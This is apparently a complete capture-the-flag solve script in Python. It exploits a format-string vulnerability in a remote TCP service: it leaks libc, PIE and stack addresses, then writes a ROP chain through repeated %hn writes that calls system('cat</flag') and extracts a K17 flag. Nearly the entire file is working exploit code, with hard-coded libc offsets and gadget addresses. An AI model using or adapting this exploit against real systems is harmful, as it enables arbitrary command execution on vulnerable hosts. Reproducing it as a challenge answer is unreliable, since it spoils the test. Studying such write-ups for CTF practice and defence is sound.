#!/usr/bin/env python3
import json
import os
import re
import socket
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
INDEX_PROMPT = b"Enter an index: "
FIRST_PROMPT = b"Enter the first input to be echoed: "
SECOND_PROMPT = b"Enter the second input to be echoed: "

LIBC_START_CALL_MAIN_RETURN = 0x29CA8
SYSTEM_OFFSET = 0x53110
EXIT_OFFSET = 0x42360
MAIN_OFFSET = 0x1169
PIE_RET_OFFSET = 0x10D8

# Every entry is a verified pop-register; ret gadget in the supplied libc.
# Any register except rsp works for skipping the one stack word that must stay
# intact while the format-string write primitive is active.
SKIP_GADGET_OFFSETS = (
    0x285D7,  # pop r12; ret
    0x29B69,  # pop r12; ret
    0x2A05A,  # pop rbp; ret
    0x2A145,  # pop rdi; ret
    0x2A6F7,
    0x2A7A9,
    0x2A9BF,  # pop rbx; ret
    0x2AA05,
    0x2AA7E,
    0x2B4BC,
    0x2B6C0,
    0x2B877,
    0x2BF50,
    0x2C220,
    0x2C5E0,
    0x2C838,
    0x2CF05,
    0x2D454,
    0x2DA3B,
    0x2E03A,
    0x2E719,
    0x2EBD4,
    0x2F854,
)
POP_RDI_OFFSET = 0x2A145
DEBUG = os.environ.get("HB2_DEBUG") == "1"


def debug(message: str) -> None:
    if DEBUG:
        print(message, file=sys.stderr, flush=True)


class Connection:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=8.0)
        self.sock.settimeout(8.0)
        self.buffer = bytearray()

    def close(self) -> None:
        self.sock.close()

    def send_line(self, data: bytes) -> None:
        if b"\n" in data or b"\r" in data or len(data) > 31:
            raise ValueError("invalid scanf token")
        self.sock.sendall(data + b"\n")

    def recv_until(self, marker: bytes) -> bytes:
        while True:
            position = self.buffer.find(marker)
            if position >= 0:
                end = position + len(marker)
                result = bytes(self.buffer[:end])
                del self.buffer[:end]
                return result
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError("connection closed")
            self.buffer.extend(chunk)

    def recv_all(self) -> bytes:
        result = bytearray(self.buffer)
        self.buffer.clear()
        while True:
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            result.extend(chunk)
        return bytes(result)


def load_endpoint() -> tuple[str, int]:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    if endpoint["protocol"] != "tcp":
        raise ValueError("main endpoint is not raw TCP")
    return endpoint["host"], endpoint["port"]


def one_write(value: int, argument: int, suffix: str) -> bytes:
    modulus = 0x100 if suffix == "hhn" else 0x10000
    value %= modulus
    padding = b"" if value == 0 else f"%{value}c".encode()
    payload = padding + f"%{argument}${suffix}".encode()
    if len(payload) > 31:
        raise ValueError("format token is too long")
    return payload


def two_halfword_writes(writes: list[tuple[int, int]]) -> bytes:
    writes = sorted(((value & 0xFFFF, argument) for value, argument in writes))
    payload = bytearray()
    printed = 0
    for value, argument in writes:
        delta = (value - printed) & 0xFFFF
        if delta:
            payload.extend(f"%{delta}c".encode())
        payload.extend(f"%{argument}$hn".encode())
        printed = value
    if len(payload) > 31:
        raise ValueError("combined format token is too long")
    return bytes(payload)


def start_round(io: Connection, index: int = 0) -> bytes:
    io.send_line(str(index).encode())
    return io.recv_until(FIRST_PROMPT)


def finish_round(io: Connection, first: bytes, second: bytes) -> bytes:
    io.send_line(first)
    io.recv_until(SECOND_PROMPT)
    io.send_line(second)
    return io.recv_until(INDEX_PROMPT)


def bootstrap(host: str, port: int) -> Connection:
    # arg20 points to the arg50 stack slot. arg50 points exactly 0x100 bytes
    # above main's saved RIP. Index 258 leaks byte 1 of arg50; only its
    # 16-byte-aligned low byte remains unknown, so retry the 16 candidates.
    low_byte_candidates = tuple(range(0x08, 0x100, 0x10))
    for attempt in range(128):
        io = Connection(host, port)
        try:
            io.recv_until(INDEX_PROMPT)
            lucky_response = start_round(io, 258)
            match = re.search(rb"lucky number is 0x([0-9a-fA-F]+)", lucky_response)
            if match is None:
                raise ValueError("missing lucky-byte leak")
            byte_one = int(match.group(1), 16)
            if byte_one == 0:
                raise ValueError("stack pointer crossed a 64 KiB boundary")

            guessed_byte_zero = low_byte_candidates[attempt % len(low_byte_candidates)]
            saved_rip_low = ((byte_one - 1) << 8) | guessed_byte_zero
            first = one_write(saved_rip_low, 20, "hn")
            second = one_write(0xA1, 50, "hhn")
            finish_round(io, first, second)
            debug(
                f"bootstrap attempt={attempt + 1} byte1=0x{byte_one:02x} "
                f"byte0=0x{guessed_byte_zero:02x}"
            )
            return io
        except (EOFError, OSError, ValueError, socket.timeout):
            io.close()
    raise RuntimeError("could not establish the repeated-main write primitive")


def leak_layout(io: Connection) -> tuple[int, int, int]:
    start_round(io)
    first = b"%19$p|%21$p|%50$p"
    second = one_write(0xA1, 50, "hhn")
    response = finish_round(io, first, second)
    match = re.search(rb"(0x[0-9a-f]+)\|(0x[0-9a-f]+)\|(0x[0-9a-f]+)", response)
    if match is None:
        raise ValueError("failed to parse stable-process address leaks")

    libc_return, pie_main, saved_rip = (int(value, 16) for value in match.groups())
    libc_base = libc_return - LIBC_START_CALL_MAIN_RETURN
    pie_base = pie_main - MAIN_OFFSET
    if libc_base & 0xFFF or pie_base & 0xFFF or saved_rip & 7:
        raise ValueError("leaked layout failed alignment checks")
    debug(
        f"layout libc=0x{libc_base:x} pie=0x{pie_base:x} "
        f"saved_rip=0x{saved_rip:x}"
    )
    return libc_base, pie_base, saved_rip


def write_halfword(io: Connection, saved_rip: int, address: int, value: int) -> None:
    debug(f"write16 address=0x{address:x} value=0x{value & 0xffff:04x}")

    # Setup round: arg50 currently points to saved RIP. Preserve the main loop
    # through the cached arg50 value, then retarget the arg50 slot through
    # arg20. The harmless second printf sees the new target but does not write.
    start_round(io)
    target_low = address & 0xFFFF
    delta = (target_low - 0xA1) & 0xFFFF
    first = bytearray(b"%161c%50$hhn")
    if delta:
        first.extend(f"%{delta}c".encode())
    first.extend(b"%20$hn")
    if len(first) > 31:
        raise ValueError("setup format token is too long")
    finish_round(io, bytes(first), b"A")

    # Write round: write through the old cached arg50 target and restore arg50
    # to saved RIP through arg20. The second printf then reinstates 0x29ca1.
    start_round(io)
    first = two_halfword_writes(
        [
            (value, 50),
            (saved_rip & 0xFFFF, 20),
        ]
    )
    second = one_write(0xA1, 50, "hhn")
    finish_round(io, first, second)


def write_bytes(io: Connection, saved_rip: int, address: int, data: bytes) -> None:
    if len(data) % 2:
        data += b"\0"
    for offset in range(0, len(data), 2):
        value = int.from_bytes(data[offset : offset + 2], "little")
        write_halfword(io, saved_rip, address + offset, value)


def write_qword(io: Connection, saved_rip: int, address: int, value: int) -> None:
    write_bytes(io, saved_rip, address, struct.pack("<Q", value))


def choose_skip_gadget(libc_base: int) -> int:
    original_return = libc_base + LIBC_START_CALL_MAIN_RETURN
    for offset in SKIP_GADGET_OFFSETS:
        candidate = libc_base + offset
        if candidate >> 16 == original_return >> 16:
            return candidate
    raise ValueError("no one-halfword skip gadget matches this libc layout")


def exploit(io: Connection, libc_base: int, pie_base: int, saved_rip: int) -> bytes:
    skip_gadget = choose_skip_gadget(libc_base)
    pop_rdi = libc_base + POP_RDI_OFFSET
    system = libc_base + SYSTEM_OFFSET
    exit_function = libc_base + EXIT_OFFSET
    pie_ret = pie_base + PIE_RET_OFFSET
    command_address = saved_rip + 0x80
    debug(
        f"rop skip=0x{skip_gadget:x} pop_rdi=0x{pop_rdi:x} "
        f"system=0x{system:x} command=0x{command_address:x}"
    )

    # saved_rip + 8 must remain the arg20 pointer until the final round.
    # The first gadget consumes it, and the chain continues at +16.
    write_qword(io, saved_rip, saved_rip + 0x18, pop_rdi)
    write_qword(io, saved_rip, saved_rip + 0x20, command_address)
    write_qword(io, saved_rip, saved_rip + 0x28, system)
    write_qword(io, saved_rip, saved_rip + 0x30, exit_function)
    write_bytes(io, saved_rip, command_address, b"cat</flag\0")

    loop_return = libc_base + 0x29CA1
    write_halfword(io, saved_rip, saved_rip, loop_return & 0xFFFF)

    # In one printf, use the old cached arg50 to arm saved RIP and arg20 to
    # retarget arg50. The second printf changes the caller's main pointer into
    # a PIE ret gadget, completing the stack chain without an intermediate
    # invalid control-flow edge.
    start_round(io)
    caller_main_slot = saved_rip + 0x10
    first = two_halfword_writes(
        [
            (skip_gadget & 0xFFFF, 50),
            (caller_main_slot & 0xFFFF, 20),
        ]
    )
    debug(f"final first={first!r} second_target=0x{pie_ret & 0xffff:04x}")
    io.send_line(first)
    io.recv_until(SECOND_PROMPT)
    io.send_line(one_write(pie_ret & 0xFFFF, 50, "hn"))
    return io.recv_all()


def main() -> int:
    try:
        host, port = load_endpoint()
        io = bootstrap(host, port)
        try:
            libc_base, pie_base, saved_rip = leak_layout(io)
            response = exploit(io, libc_base, pie_base, saved_rip)
        finally:
            io.close()
        match = re.search(rb"K17\{[^}\r\n]+\}", response)
        if match is None:
            raise RuntimeError("the exploit completed without a flag")
        sys.stdout.buffer.write(match.group(0))
        return 0
    except Exception as error:
        print(f"solve failed: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
